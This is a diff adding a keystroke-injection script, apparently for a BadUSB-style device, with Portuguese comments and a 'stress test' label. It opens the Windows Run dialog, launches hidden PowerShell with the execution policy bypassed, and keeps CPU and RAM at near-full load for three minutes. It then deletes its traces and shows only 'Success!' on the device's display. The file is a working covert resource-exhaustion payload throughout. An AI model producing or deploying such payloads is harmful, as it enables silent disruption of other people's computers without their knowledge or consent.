@@ -1,0 +1,76 @@
+REM ===============================================
+REM 🔥 PP_Tech Stealth Stress Test - ABNT2 BR 🔥
+REM Baseado nos scripts PowerShell LoadScripts
+REM Totalmente silencioso - apenas "Success!" no LCD
+REM ===============================================
+
+REM Configuração inicial silenciosa
+LED_OFF
+DISPLAY_CLEAR
+DELAY 2000
+
+REM Apenas uma mensagem discreta no LCD
+DISPLAY_TEXT 20 30 PP_Tech
+DISPLAY_TEXT 15 50 Loading...
+
+REM Executar stress test totalmente silencioso
+GUI r
+DELAY 1000
+
+REM PowerShell completamente oculto - baseado em loadcpu.ps1 + loadram.ps1
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
+DELAY 500
+
+REM CPU Stress baseado em loadcpu.ps1 (stealth)
+STRING $cpus=$env:NUMBER_OF_PROCESSORS;
+DELAY 200
+STRING [System.Threading.Thread]::CurrentThread.Priority='Highest';
+DELAY 200
+STRING 1..$cpus|ForEach{Start-Job -ScriptBlock{$r=1;1..0x7FFFFFFF|ForEach{$r*=$_}}};
+DELAY 500
+
+REM RAM Stress baseado em loadram.ps1 (stealth)
+STRING $box=gwmi Win32_ComputerSystem;
+DELAY 200
+STRING $physMB=$box.TotalPhysicalMemory/1MB;
+DELAY 200
+STRING $maxRAM=$physMB-512;
+DELAY 200
+STRING $a='a'*200MB;
+DELAY 200
+STRING $growArray=@();$bigArray=@();$k=0;
+DELAY 200
+STRING while((($physMB-(gwmi Win32_PerfRawData_PerfOS_Memory).AvailableMBytes))-lt $maxRAM){
+DELAY 200
+STRING $bigArray+=,@($k,$growArray);$k++;$growArray+=$a};
+DELAY 500
+
+REM Disk I/O mínimo e stealth
+STRING 1..50|ForEach{('x'*1KB)|Out-File $env:TEMP\t$_.tmp -Encoding ASCII};
+DELAY 300
+
+REM Auto-limpeza após 3 minutos
+STRING Start-Sleep 180;
+DELAY 200
+STRING Get-Job|Stop-Job;Get-Job|Remove-Job;
+DELAY 200
+STRING $bigArray=$null;$growArray=$null;[System.GC]::Collect();
+DELAY 200
+STRING Remove-Item $env:TEMP\t*.tmp -Force -EA 0;
+DELAY 200
+STRING exit"
+ENTER
+
+REM Aguardar 10 segundos e mostrar sucesso
+DELAY 10000
+
+REM Mostrar apenas "Success!" discretamente
+DISPLAY_CLEAR
+DISPLAY_TEXT 30 40 Success!
+LED 0 255 0 100
+
+REM Manter por 5 segundos e resetar silenciosamente
+DELAY 5000
+DISPLAY_CLEAR
+LED_OFF
+RESET
